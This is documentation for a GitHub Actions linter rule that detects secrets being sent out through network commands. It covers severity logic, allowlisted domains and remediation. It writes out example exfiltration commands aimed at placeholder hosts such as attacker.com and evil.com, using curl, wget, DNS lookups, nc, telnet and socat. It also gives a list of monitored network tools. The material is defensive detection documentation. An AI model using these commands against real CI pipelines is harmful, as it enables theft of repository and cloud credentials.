---
title: "Secret Exfiltration Rule"
weight: 44
---

# Secret Exfiltration Rule

## Overview

The `secret-exfiltration` rule detects patterns where GitHub Actions secrets may be exfiltrated to external services via network commands. This helps identify potential security vulnerabilities where secrets could be stolen by malicious actors.

> **Note on lineage:** This rule is a sisakulint-original design. The upstream CodeQL Actions query catalog has no equivalent network-command/argument-level secret-sink detector — the closest CodeQL query, *Excessive Secrets Exposure*, addresses over-broad `permissions:` scopes rather than per-argument secret sinks. Likewise, zizmor's `secrets-inherit` / `github-token-leak` audits target a materially different attack surface. The detection model described below was authored from scratch.

## Rule ID

`secret-exfiltration`

## Severity Levels

Severity is decided **per argument**, not per command. The rule emits two levels (`critical` and `high`) via `severityForCallArg` (`pkg/core/secretexfiltration.go:1273`):

- **Critical** is emitted when **both** of the following hold:
  - The command is `curl` or `wget`, AND
  - The secret rides on a **data flag** — for `curl`: `-d` / `--data` / `--data-raw` / `-F` / `--form` / `-H` / `--header`; for `wget`: `--post-data` / `--post-file` / `--header`.
- **High** is emitted in every other case the rule observes a secret leaving via a network command — including curl/wget when the secret is on a non-data argument (e.g. embedded in the URL), and any use of `http` / `https` (HTTPie) / `nc` / `netcat` / `ncat` / `telnet` / `socat` / `dig` / `nslookup` / `host`. These commands have no `dataFlags` table; their severity always degrades to **High** because the rule does not attempt argument classification on them.

The `-X POST` flag is **not** used as a signal — the rule keys on the data-flag presence of the secret, not the HTTP method.

## Detected Patterns

### 1. Direct Secret Exfiltration via HTTP

Secrets passed directly to network commands that send data to external URLs. All three examples below are flagged as **Critical** because the secret rides on a curl/wget data flag (`-d`, `-H`, `--post-data`):

```yaml
# CRITICAL: curl with secret in POST data (-d is a curl data flag)
- run: |
    curl https://attacker.com/collect \
      -d "token=${{ secrets.API_TOKEN }}"

# CRITICAL: Secret in HTTP header (-H is a curl data flag)
- run: |
    curl -H "Authorization: Bearer ${{ secrets.AUTH_TOKEN }}" \
      https://unknown-server.com/api

# CRITICAL: wget with POST data (--post-data is a wget data flag)
- run: |
    wget --post-data "key=${{ secrets.SECRET_KEY }}" \
      https://malicious.site/exfil

# HIGH: Secret embedded in the URL (no data flag, severity degrades)
- run: |
    curl "https://attacker.com/collect?token=${{ secrets.API_TOKEN }}"
```

### 2. DNS Exfiltration

Secrets embedded in DNS queries for data exfiltration:

```yaml
# BAD: dig with secret in subdomain
- run: dig ${{ secrets.TOKEN }}.attacker.com

# BAD: nslookup exfiltration
- run: nslookup ${{ secrets.SECRET }}.evil.com

# BAD: host command exfiltration
- run: host ${{ secrets.API_KEY }}.malicious.com
```

### 3. Raw Socket Exfiltration

Secrets piped to low-level network tools:

```yaml
# BAD: netcat exfiltration
- run: echo "${{ secrets.PASSWORD }}" | nc attacker.com 443

# BAD: telnet exfiltration
- run: echo "${{ secrets.CREDENTIALS }}" | telnet evil.com 23

# BAD: socat exfiltration
- run: echo "${{ secrets.TOKEN }}" | socat - TCP:attacker.com:8080
```

### 4. Environment Variable Leak

Secrets passed via environment variables to network commands. **Routing the secret through `env:` does not lower its severity** — the rule tracks env-var-borne secrets back to the source and emits the same severity as if the secret were inlined:

```yaml
# CRITICAL: env-var-routed secret still rides on -d (data flag)
- env:
    MY_SECRET: ${{ secrets.SENSITIVE_DATA }}
  run: |
    curl https://attacker.com/collect \
      -d "data=$MY_SECRET"
```

This means `env:` is **not** a mitigation for exfiltration — it is only a mitigation for shell-injection (see `code-injection-critical`). Removing the dangerous destination is the only effective fix here.

## Safe Patterns (Not Flagged)

The patterns below are **not flagged because their commands are outside `networkCommands`** (`npm`, `docker`, `aws`, `gcloud`, `az`, `gh`, `git`, `terraform`, `vault`, `twine`, …) — they are not "allowlisted destinations", they are simply not commands the rule analyzes. If you wrap any of these tools so that `curl`/`wget`/`nc`/etc. is actually invoked in the same step, that wrapped call will be analyzed normally.

### Package Publishing

```yaml
# GOOD: npm publish
- run: npm publish --access public
  env:
    NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

# GOOD: docker login
- run: docker login ghcr.io -u ${{ github.actor }} -p ${{ secrets.GITHUB_TOKEN }}

# GOOD: twine upload
- run: twine upload dist/*
  env:
    TWINE_PASSWORD: ${{ secrets.PYPI_TOKEN }}
```

### Cloud CLI Authentication

```yaml
# GOOD: AWS CLI
- run: aws configure set aws_access_key_id ${{ secrets.AWS_ACCESS_KEY_ID }}

# GOOD: gcloud auth
- run: gcloud auth activate-service-account --key-file=key.json

# GOOD: Azure login
- run: az login --service-principal -u ${{ secrets.AZURE_CLIENT_ID }}
```

### Trusted API Endpoints

```yaml
# GOOD: GitHub API
- run: |
    curl -X POST https://api.github.com/repos/owner/repo/releases \
      -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"

# GOOD: Slack webhook
- run: |
    curl -X POST https://hooks.slack.com/services/xxx/yyy/zzz \
      -d '{"text": "Build completed!"}'

# GOOD: Codecov
- run: codecov -t ${{ secrets.CODECOV_TOKEN }}
```

### Infrastructure Tools

```yaml
# GOOD: Terraform
- run: terraform login app.terraform.io
  env:
    TF_TOKEN_app_terraform_io: ${{ secrets.TF_API_TOKEN }}

# GOOD: Vault
- run: vault login -method=token token=${{ secrets.VAULT_TOKEN }}
```

### Git Operations

```yaml
# GOOD: git push
- run: git push origin main
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

# GOOD: gh CLI
- run: gh pr create --title "PR title" --body "PR body"
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

## Network Commands Monitored

The "Risk Level" column shows the severity emitted **when a secret reaches a data flag** for that command. When no data flag is involved, the rule degrades to **High** for any command in this table.

| Command | Risk when secret is on a data flag | Data flags |
|---------|------------------------------------|------------|
| `curl` | Critical | `-d`, `--data`, `--data-raw`, `-F`, `--form`, `-H`, `--header` |
| `wget` | Critical | `--post-data`, `--post-file`, `--header` |
| `http` / `https` (HTTPie) | High | (no per-flag classification) |
| `nc` / `netcat` / `ncat` | High | (piped/stdin input — see *Stdin/Pipe Sink Detection* below) |
| `telnet` | High | (piped/stdin input) |
| `socat` | High | (piped/stdin input) |
| `dig` | High | (DNS exfiltration — query argument) |
| `nslookup` | High | (DNS exfiltration — query argument) |
| `host` | High | (DNS exfiltration — query argument) |

### Stdin / Pipe Sink Detection

For `nc` / `netcat` / `ncat` / `telnet` / `socat`, the rule additionally tracks **PipeInputs** (commands feeding the network tool through a shell pipe) and **StdinInputs** (commands feeding it via `<<<`, `<`, or heredoc). A `printf '%s' "$SECRET" | nc attacker 443` invocation is flagged because the secret reaches the network tool's stdin, even though it never appears as a positional argument.

### Mixed-Destination Semantics

When a single command invocation has multiple destination arguments (e.g. `curl -d 'x' https://a.example https://b.example`), the rule suppresses the finding **only if every destination is allowlisted**. A mix of trusted and untrusted destinations still emits a diagnostic — the rule errs on the side of reporting.

## Trusted Domains (Allowlisted)

The following destinations are in the built-in `legitPatterns` allowlist and do not trigger alerts:

- GitHub: `api.github.com`, `githubusercontent.com`
- Package Registries: `registry.npmjs.org`, `pypi.org`, `rubygems.org`, `crates.io`, `nuget.org`
- Container Registries: `ghcr.io`, `docker.io`, `gcr.io`, `ecr.aws`, `azurecr.io`
- CI/CD Services: `codecov.io`, `coveralls.io`, `circleci.com`, `travis-ci.com`
- Monitoring: `sentry.io`, `datadoghq.com`, `newrelic.com`
- Notifications: `hooks.slack.com`, `slack.com/api`, `discord.com/api`, `api.telegram.org`
- Security Tools: `snyk.io`, `sonarcloud.io`
- Infrastructure: `app.terraform.io`, `hashicorp`
- Artifact Management: `jfrog.io`, `sonatype.org`

> ⚠️ Previous versions of this documentation listed `github.com` (bare), `vault.*` (wildcard), `artifactory`, and `nexus`. These entries are **not** in the built-in allowlist and were incorrect; they have been removed. Use the per-workflow allowed-hosts directive (below) to add your own internal Vault or Artifactory hosts.

### Per-Workflow `allowed-hosts` Directive

You can extend the allowlist on a per-workflow basis with a comment directive in the workflow file. The directive is parsed by the rule and merged with the global `legitPatterns` set for that workflow only. Directive-sourced entries that are declared but never matched produce a **dead-allow** warning, and entries that fail to parse produce an **invalid-entry** warning — see the next two subsections.

### Dead-Allow Warning

If a `allowed-hosts` directive declares a host that the rule never references during analysis of that workflow, the rule emits a diagnostic prompting you to remove the unused entry. This prevents allowlists from growing stale and silently widening trust over time.

### Invalid-Entry Warning

Malformed entries in an `allowed-hosts` directive (e.g. unquoted patterns, syntax errors) are reported as invalid-entry warnings. The rule does **not** silently drop them — an unparsed entry never widens the allowlist by accident.

## Why This Rule Matters

1. **Data Theft**: Attackers with write access to workflows can add steps that exfiltrate secrets to their servers
2. **Supply Chain Attacks**: Compromised dependencies or actions could exfiltrate secrets
3. **Insider Threats**: Malicious contributors could steal secrets via workflow modifications
4. **DNS Tunneling**: Even firewalled environments may allow DNS queries, enabling data exfiltration

## Remediation

1. **Review all network commands** that use secrets
2. **Verify destination URLs** are trusted and necessary (use the `allowed-hosts` directive for legitimate internal hosts)
3. **Limit secret scope** using job-level or step-level secrets
4. **Enable audit logging** to track secret access
5. **Use OIDC** instead of long-lived credentials where possible

> Note: Routing the secret through `env:` is **not a remediation for exfiltration.** The rule detects env-var-borne secrets at the same severity as inline secrets. Use `env:` to defend against shell injection (see [`code-injection-critical`]({{< ref "codeinjectioncritical.md" >}})); use destination removal / dedicated actions / OIDC to defend against exfiltration.

## Example Fix

Before (Vulnerable — Critical, secret on a `-d` data flag):
```yaml
- run: |
    curl https://analytics.company.com/track \
      -d "api_key=${{ secrets.ANALYTICS_KEY }}"
```

After:
```yaml
# Option 1 (preferred): Use a dedicated action so the secret never
# crosses a network-command boundary in your workflow.
- uses: company/analytics-action@v1
  with:
    api-key: ${{ secrets.ANALYTICS_KEY }}

# Option 2: Route through an allowlisted destination. Note that
# moving the secret into env: does NOT change the severity — the
# rule still tracks it. The fix here is the trusted destination
# (api.segment.io would also need an allowed-hosts directive if
# not in the built-in legitPatterns set).
- env:
    ANALYTICS_KEY: ${{ secrets.ANALYTICS_KEY }}
  run: |
    curl https://api.segment.io/v1/track \
      -H "Authorization: Bearer $ANALYTICS_KEY"
```

> Auto-fix: the `secret-exfiltration` rule has **no auto-fix**. Remediation requires a human judgment about whether the destination is legitimate and whether the secret needs to reach the network at all.

## Related Rules

- `secret-exposure`: Detects excessive secret exposure patterns like `toJSON(secrets)`
- `unmasked-secret-exposure`: Detects derived secrets that aren't automatically masked
- `credential-rule`: Detects hardcoded credentials in workflows

## References

- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Encrypted Secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/encrypted-secrets)
- [DNS Tunneling Attacks](https://www.infoblox.com/glossary/dns-tunneling/)
